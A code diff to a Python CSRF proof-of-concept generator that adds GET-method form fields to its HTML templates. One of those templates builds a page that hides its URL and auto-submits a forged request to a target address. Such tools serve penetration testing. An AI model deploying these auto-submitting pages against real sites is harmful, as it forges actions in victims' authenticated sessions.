@@ -48,7 +48,9 @@ class CSRF_PoC_Generator():
         for i in range (0, len(self.data_set)//2):
             if (self.method == "POST"):
                 form_lines += "<input type=\"hidden\" value={} name={} />\n\t".format(self.values[i],self.names[i])
-  
+            if (self.method == "GET"):
+                form_lines += "<input type=\"text\" value={} name={} />\n\t".format(self.values[i], self.names[i])
+
         HTML_CODE = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n</body>\n</html>".format(self.method, self.uri, form_lines)
        
         HTML_CODE_AUTO_SUBMIT = "<html>\n<head>\n\t<title>CSRF PoC</title>\n\r</head>\n<body>\n<script>history.pushState('', '', '/')</script>\n\t<form  method=\"{}\" action=\"{}\">\n\t{}<input type=\"submit\" value=\"Submit Request\">\n\t</form>\n\t<script>\n\t\tdocument.forms[0].submit();\n\t</script>\n</body>\n</html>".format(self.method, self.uri, form_lines)
